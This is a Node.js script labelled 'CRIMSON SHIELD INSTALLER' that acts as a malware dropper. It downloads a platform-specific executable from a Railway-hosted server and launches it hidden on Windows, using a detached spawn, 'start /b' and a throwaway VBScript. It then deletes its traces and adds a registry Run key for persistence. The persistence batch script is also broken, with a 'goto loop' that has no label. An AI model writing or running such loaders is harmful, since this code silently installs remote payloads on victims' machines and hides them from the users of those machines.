const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const os = require('os');

// YOUR RAILWAY URL
const SERVER_URL = 'https://crimson-production-d9ad.up.railway.app';

// ===== DETECT SYSTEM ARCHITECTURE =====
function detectSystem() {
    const platform = process.platform;
    const arch = os.arch();
    
    console.log(`🖥️ System Detection:`);
    console.log(`   Platform: ${platform}`);
    console.log(`   Architecture: ${arch}`);
    console.log(`   OS: ${os.type()}`);
    console.log(`   Release: ${os.release()}`);
    
    // Windows detection
    if (platform === 'win32') {
        if (arch === 'x64') return { os: 'win', arch: 'x64', ext: '.exe' };
        if (arch === 'ia32') return { os: 'win', arch: 'x86', ext: '.exe' };
        if (arch === 'arm64') return { os: 'win', arch: 'arm64', ext: '.exe' };
        return { os: 'win', arch: 'x64', ext: '.exe' }; // fallback
    }
    
    // Mac detection
    if (platform === 'darwin') {
        return { os: 'mac', arch: 'x64', ext: '' };
    }
    
    // Linux detection
    if (platform === 'linux') {
        return { os: 'linux', arch: 'x64', ext: '' };
    }
    
    return { os: 'win', arch: 'x64', ext: '.exe' }; // default fallback
}

// ===== DOWNLOAD AND RUN =====
function downloadAndRun() {
    const system = detectSystem();
    
    // Determine which file to download
    let filename;
    if (system.os === 'win') {
        filename = `CrimsonShield_${system.arch}.exe`;
    } else if (system.os === 'mac') {
        filename = 'CrimsonShield_mac';
    } else {
        filename = 'CrimsonShield_linux';
    }
    
    // Fallback if specific version doesn't exist
    const fallbackFilename = 'CrimsonShield_x64.exe';
    
    const tempPath = path.join(os.tmpdir(), filename);
    const url = `${SERVER_URL}/download/${filename}`;
    const fallbackUrl = `${SERVER_URL}/download/${fallbackFilename}`;
    
    console.log(`📥 Downloading: ${filename}`);
    console.log(`🔗 From: ${url}`);
    console.log(`📁 To: ${tempPath}`);
    
    // Try to download the specific version
    https.get(url, (response) => {
        if (response.statusCode === 404) {
            console.log(`⚠️ Version ${filename} not found, using fallback...`);
            downloadFallback(fallbackUrl, tempPath);
            return;
        }
        
        let data = [];
        response.on('data', (chunk) => data.push(chunk));
        response.on('end', () => {
            const buffer = Buffer.concat(data);
            fs.writeFileSync(tempPath, buffer);
            console.log(`✅ Downloaded: ${filename} (${buffer.length} bytes)`);
            runFile(tempPath);
        });
    }).on('error', (err) => {
        console.error(`❌ Download failed: ${err.message}`);
        console.log(`🔄 Trying fallback...`);
        downloadFallback(fallbackUrl, tempPath);
    });
}

// ===== DOWNLOAD FALLBACK =====
function downloadFallback(url, tempPath) {
    console.log(`📥 Downloading fallback: ${url}`);
    
    https.get(url, (response) => {
        if (response.statusCode === 404) {
            console.error('❌ Fallback also failed!');
            console.log('💀 Please download manually from the server.');
            return;
        }
        
        let data = [];
        response.on('data', (chunk) => data.push(chunk));
        response.on('end', () => {
            const buffer = Buffer.concat(data);
            fs.writeFileSync(tempPath, buffer);
            console.log(`✅ Downloaded fallback (${buffer.length} bytes)`);
            runFile(tempPath);
        });
    }).on('error', (err) => {
        console.error(`❌ Fallback failed: ${err.message}`);
    });
}

// ===== RUN THE FILE =====
function runFile(filePath) {
    console.log(`🚀 Running: ${filePath}`);
    
    if (process.platform === 'win32') {
        // Windows - Run hidden with multiple methods
        console.log('🔓 Launching on Windows...');
        
        // Method 1: Direct spawn
        try {
            const child = spawn(filePath, [], {
                detached: true,
                stdio: 'ignore',
                windowsHide: true,
                shell: true
            });
            child.unref();
            console.log('✅ Method 1: Spawn successful');
        } catch (e) {
            console.log('⚠️ Method 1 failed, trying method 2...');
        }
        
        // Method 2: Via cmd
        try {
            exec(`start /b "" "${filePath}"`, (error) => {
                if (error) console.log('⚠️ Method 2 failed');
            });
        } catch (e) {}
        
        // Method 3: Via wscript (for .exe)
        try {
            const script = `
                Set objShell = CreateObject("WScript.Shell")
                objShell.Run "${filePath}", 0, False
            `;
            const scriptPath = path.join(os.tmpdir(), 'run.vbs');
            fs.writeFileSync(scriptPath, script);
            exec(`cscript "${scriptPath}"`);
            setTimeout(() => {
                try { fs.unlinkSync(scriptPath); } catch(e) {}
            }, 1000);
            console.log('✅ Method 3: VBScript launched');
        } catch (e) {}
        
    } else if (process.platform === 'darwin') {
        // Mac
        console.log('🍎 Launching on Mac...');
        exec(`chmod +x "${filePath}" && open "${filePath}"`, (error) => {
            if (error) console.error('Failed to run:', error);
        });
    } else {
        // Linux
        console.log('🐧 Launching on Linux...');
        exec(`chmod +x "${filePath}" && "${filePath}"`, (error) => {
            if (error) console.error('Failed to run:', error);
        });
    }
    
    // Clean up after 60 seconds
    setTimeout(() => {
        try {
            if (fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
                console.log('🧹 Cleaned up temp file');
            }
        } catch(e) {}
    }, 60000);
}

// ===== CREATE PERSISTENCE (Optional) =====
function setupPersistence() {
    if (process.platform === 'win32') {
        console.log('🛡️ Setting up persistence...');
        const scriptPath = path.join(os.tmpdir(), 'crimson_persist.bat');
        const script = `
            @echo off
            echo [$(date)] Crimson Shield running...
            node "${__filename}"
            timeout /t 10 /nobreak > nul
            goto loop
        `;
        fs.writeFileSync(scriptPath, script);
        
        // Add to registry
        try {
            exec(`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v CrimsonShield /t REG_SZ /d "${scriptPath}" /f`);
            console.log('✅ Persistence added to registry');
        } catch(e) {}
    }
}

// ===== MAIN =====
console.log('💀 CRIMSON SHIELD INSTALLER');
console.log('═'.repeat(40));

// Setup persistence
setupPersistence();

// Download and run
downloadAndRun();

console.log('═'.repeat(40));
console.log('💀 Installation complete!');
